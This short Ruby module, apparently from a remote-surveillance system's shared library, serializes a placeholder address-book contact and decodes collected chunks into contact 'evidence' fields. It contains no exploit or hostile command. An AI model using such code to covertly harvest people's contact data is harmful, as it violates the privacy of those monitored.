require 'rcs-common/evidence/common'
require 'rcs-common/serializer'

module RCS
module AddressbookEvidence
  def content
    fields = { :first_name => "John", :last_name => "Doe", :company => "Acme Inc.", :mobile_phone_number => "00155597865"}
    PoomSerializer.new.serialize fields
  end
  
  def generate_content
    [ content ]
  end
  
  def decode_content
    stream = StringIO.new @info[:chunks].join
    #size = read_uint32 stream
    #puts "Size => #{size}"

    @poom = PoomSerializer.new.unserialize stream
    
    @info[:contact_name] = @poom.name
    @info[:contact_email] = @poom.contact
    @info[:contact_info] = @poom.info
    
    return [self]
  end
end # ::AddressbookEvidence
end # ::RCS